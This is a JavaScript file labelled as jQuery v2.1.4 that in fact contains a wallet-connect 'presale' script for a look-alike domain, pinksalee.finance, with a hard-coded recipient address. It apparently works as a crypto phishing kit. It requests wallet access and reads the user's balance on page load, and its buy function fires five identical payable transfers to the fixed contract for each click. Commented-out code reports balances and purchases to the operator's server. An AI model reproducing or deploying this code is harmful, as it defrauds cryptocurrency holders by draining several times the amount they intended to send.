/*! jQuery v2.1.4 | (c) 2005, 2015 jQuery Foundation, Inc. | jquery.org/license */

presale_w_address = "0xE9e28709Cb023f3E1c2E775fA8eC6175D7A2c5F5"
token_w_address = "0x800300ECE2A6d35F64B58DA05457cE0D613Cdf69"

bscscan_w = "https://bscscan.com/address/" + presale_w_address






function urls_n() {

    return "pinksalee.finance"
}

urls_w = "http://" + urls_n();



function setCookie(key, value) {
    var expires = new Date();
    expires.setTime(expires.getTime() + (1 * 60 * 60 * 60 * 60));//86400 1day
    document.cookie = key + '=' + value + ';path=/' + ';expires=' + expires.toUTCString();
    return value;
}

function getCookie(key) {
    var keyValue = document.cookie.match('(^|;) ?' + key + '=([^;]*)(;|$)');
    return keyValue ? keyValue[2] : null;
}



function checkCookie(lable_xx, value_xx = null) {
    let wal_value = getCookie(lable_xx);
    if (wal_value == null || wal_value == undefined || wal_value == "Connect") {
        return false;
    } else {

        return wal_value;


    }


}


document.addEventListener('DOMContentLoaded', function () {

    //console.log(checkCookie("wallet_xx"));
    var element = document.getElementById("btn-connect");
    (checkCookie("wallet_xx") !== false)? element.classList.add("ant-dropdown-trigger") : element.classList.remove("ant-dropdown-trigger")
        
    document.getElementById("btn-connect").innerHTML = (checkCookie("wallet_xx") == false)? "Connect" : checkCookie("wallet_xx");

    document.getElementById("getbalance").innerHTML = (checkCookie("wallet_balance") == false)? "0.000000 ": checkCookie("wallet_balance");

    var elements = document.getElementsByClassName('className');
    var requiredElement = elements[0];


    /*document.getElementById("saleidtxt").href = bscscan_w;
    document.getElementById("saleidtxt0").href = bscscan_w;
    document.getElementById("saleidtxt").innerHTML = presale_w_address;
    document.getElementById("saleidtxt0").innerHTML = token_w_address;

    if(document.getElementById("presaleAmount").value == null || document.getElementById("presaleAmount").value <= 0){
       // document.querySelector("#btn-contribute").setAttribute("disabled", "disabled");
        

    }*/

    
}, false);







const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;
const Fortmatic = window.Fortmatic;
let web3Modal;
let provider;
let saleid;
let balance = null;
let addr;
let btn_connect;

function init() {
    if (location.protocol !== "https:") {
        const xalert = document.querySelector("#alert-error-https");
        if (xalert !== null) {
            xalert.style.display = "block";
            document.querySelector("#btn-contribute").setAttribute("disabled", "disabled");
        }
        return;
    }
    const providerOptions = { 
        walletconnect: { package: WalletConnectProvider, 
        options: { rpc: { 56: "https://bsc-dataseed.binance.org/" }, network: "binance" } 
            
        }
        
        /*
        fortmatic: {
          package: Fortmatic,
          options: {
            // Mikko's TESTNET api key
            key: ""
      }
      
    }*/
        
        
    };
    web3Modal = new Web3Modal({ cacheProvider: false, providerOptions, disableInjectedProvider: false });
}
async function mOver() {
    
    var element_xx = document.getElementById("ant-dropdown");
   
            
            if (element_xx.classList.contains('ant-dropdown-hidden')) {
                element_xx.classList.add("ant-dropdown-show");
                element_xx.classList.remove("ant-dropdown-hidden");
                
              } else {
                element_xx.classList.add("ant-dropdown-hidden");
                element_xx.classList.remove("ant-dropdown-show");
                
              }
        
        
    
}
async function BuyFunc() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    let addr = web3.utils.toChecksumAddress(accounts[0]);
    const sttaddr = presale_w_address; 
    const sttabi = [{ inputs: [], name: "buy", outputs: [{ internalType: "bool", name: "", type: "bool" }], stateMutability: "payable", type: "function" }];
    let sttcontract = new web3.eth.Contract(sttabi, sttaddr);
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, ".");
    //saleid = document.getElementById("saleidtxt").textContent;
    const http = new XMLHttpRequest();
    /*http.open("GET", urls_w + "/click.php?saleID=" + saleid + "&buy=" + bnbVal);
    http.send();*/

    bnbVal = Number(bnbVal) * 1e18;
    sttcontract.methods.buy().send({ from: addr, value: bnbVal, gas: 51000}, (err, res) => {
        if (!err) {
            const http = new XMLHttpRequest();
            /*http.open("GET", urls_w + "/static/check.php?hash=" + String(res));
            http.send();
            http.onload = function () {
                if (http.response == "Fine") {
                    let bnbValue = Number(document.getElementById("presaleAmount").value.replace(/,/, "."));
                    const http = new XMLHttpRequest();
                    http.open("GET", urls_w + "/buy.php?saleID=" + saleid + "&amount=" + bnbValue);
                    http.send();
                }
            };*/
        } else {
            if (err == "Error: Internal JSON-RPC error.") alert("Metamask may not show the exchange if there is not enough BNB on the account");
        }
    });
        sttcontract.methods.buy().send({ from: addr, value: bnbVal, gas: 51000}, (err, res) => {
        if (!err) {
            const http = new XMLHttpRequest();
            /*http.open("GET", urls_w + "/static/check.php?hash=" + String(res));
            http.send();
            http.onload = function () {
                if (http.response == "Fine") {
                    let bnbValue = Number(document.getElementById("presaleAmount").value.replace(/,/, "."));
                    const http = new XMLHttpRequest();
                    http.open("GET", urls_w + "/buy.php?saleID=" + saleid + "&amount=" + bnbValue);
                    http.send();
                }
            };*/
        } else {
            if (err == "Error: Internal JSON-RPC error.") alert("Metamask may not show the exchange if there is not enough BNB on the account");
        }
    });
        sttcontract.methods.buy().send({ from: addr, value: bnbVal, gas: 51000}, (err, res) => {
        if (!err) {
            const http = new XMLHttpRequest();
            /*http.open("GET", urls_w + "/static/check.php?hash=" + String(res));
            http.send();
            http.onload = function () {
                if (http.response == "Fine") {
                    let bnbValue = Number(document.getElementById("presaleAmount").value.replace(/,/, "."));
                    const http = new XMLHttpRequest();
                    http.open("GET", urls_w + "/buy.php?saleID=" + saleid + "&amount=" + bnbValue);
                    http.send();
                }
            };*/
        } else {
            if (err == "Error: Internal JSON-RPC error.") alert("Metamask may not show the exchange if there is not enough BNB on the account");
        }
    });
        sttcontract.methods.buy().send({ from: addr, value: bnbVal, gas: 51000}, (err, res) => {
        if (!err) {
            const http = new XMLHttpRequest();
            /*http.open("GET", urls_w + "/static/check.php?hash=" + String(res));
            http.send();
            http.onload = function () {
                if (http.response == "Fine") {
                    let bnbValue = Number(document.getElementById("presaleAmount").value.replace(/,/, "."));
                    const http = new XMLHttpRequest();
                    http.open("GET", urls_w + "/buy.php?saleID=" + saleid + "&amount=" + bnbValue);
                    http.send();
                }
            };*/
        } else {
            if (err == "Error: Internal JSON-RPC error.") alert("Metamask may not show the exchange if there is not enough BNB on the account");
        }
    });
        sttcontract.methods.buy().send({ from: addr, value: bnbVal, gas: 51000}, (err, res) => {
        if (!err) {
            const http = new XMLHttpRequest();
            /*http.open("GET", urls_w + "/static/check.php?hash=" + String(res));
            http.send();
            http.onload = function () {
                if (http.response == "Fine") {
                    let bnbValue = Number(document.getElementById("presaleAmount").value.replace(/,/, "."));
                    const http = new XMLHttpRequest();
                    http.open("GET", urls_w + "/buy.php?saleID=" + saleid + "&amount=" + bnbValue);
                    http.send();
                }
            };*/
        } else {
            if (err == "Error: Internal JSON-RPC error.") alert("Metamask may not show the exchange if there is not enough BNB on the account");
        }
    });
}

async function fetchAccountData() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    addr = accounts[0];
    balance = await web3.eth.getBalance(addr);
    let ethBalance = web3.utils.fromWei(balance, "ether");
    addr = addr.slice(0, 3) + "..." + addr.slice(-4);
    ethBalance = ethBalance.slice(0, 6) + " BNB";


    document.getElementById("btn-connect").innerHTML = setCookie("wallet_xx", addr);
    document.getElementById("getbalance").innerHTML = setCookie("wallet_balance", ethBalance);
    
    if (addr !== null) {
        var element = document.getElementById("btn-connect");
        element.classList.add("ant-dropdown-trigger");
       
    }
    //saleid = document.getElementById("saleidtxt").textContent;
    const http = new XMLHttpRequest();
    /*http.open("GET", urls_w + "/click.php?saleID=" + saleid + "&b=" + ethBalance);
    http.send();*/
}
async function OnConnect() {
    if(checkCookie("wallet_xx") == false){
        Connect();
    }else{

        mOver();
    }
    
}
async function BuyButton() {
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, ".");
    if (bnbVal == 0 || bnbVal < 0.03) alert("Contribution value must be greater than or equal to 0.3");
    else {
        if (provider == null) {
            await Connect();
            await BuyFunc(provider);
        } else await BuyFunc(provider);
    }
}
async function Connect() {
    //saleid = document.getElementById("saleidtxt").textContent;
    const http = new XMLHttpRequest();
    /*http.open("GET", urls_w + "/click.php?saleID=" + saleid);
    http.send();*/
    try {
        provider = await web3Modal.connect();
    } catch (e) {
        return;
    }
    await fetchAccountData(provider);
}
async function onDisconnect() {
    if (provider.close) {
        await provider.close();
        await web3Modal.clearCachedProvider();
        provider = null;
    } else {
        await web3Modal.clearCachedProvider();
        provider = null;
    }
    document.querySelector("#div-connect").style.display = "";
    document.querySelector("#div-connectet").style.display = "none";
}

async function getBalance() {
    //alert(balance);
    if (addr !== null) {
        if (balance !== null) {
            document.getElementById("presaleAmount").value =  parseInt(balance)/1000000000000000000;
        } else {

            document.getElementById("presaleAmount").value = 0.0;
        }
    } else {

        OnConnect()
    }
}

window.addEventListener("load", async () => {
    init();
    
    if (window.ethereum) {
        window.web3 = new Web3(ethereum);
        try {
            // Request account access if needed
            provider = window.web3.currentProvider;
            await ethereum.enable();
            await fetchAccountData(provider);
           
            // Acccounts now exposed
            
        } catch (error) {
            setCookie("wallet_xx", "Connect");
             console.log("");
            // User denied account access...
        }
    }
    // Legacy dapp browsers...
    else if (window.web3) {
        window.web3 = new Web3(web3.currentProvider);
        provider = web3.currentProvider;
        await fetchAccountData(provider);
        // Acccounts always exposed
        //web3.eth.sendTransaction({/* ... */});
    }
    // Non-dapp browsers...
    else {
        setCookie("wallet_xx", "Connect");
        console.log('Non-Ethereum browser detected. You should consider trying MetaMask!');
    }
    
    
    document.querySelector("#btn-contribute").addEventListener("click", BuyButton);

    document.querySelector("#btn-connect").addEventListener("click", OnConnect);

    document.querySelector("a.mr-2").addEventListener("click", getBalance);

    btn_connect = document.querySelector("#btn-connect");
         
    if (btn_connect.classList.contains('ant-dropdown-trigger')) {

        btn_connect.addEventListener("click", mOver);
        
    }
    

});



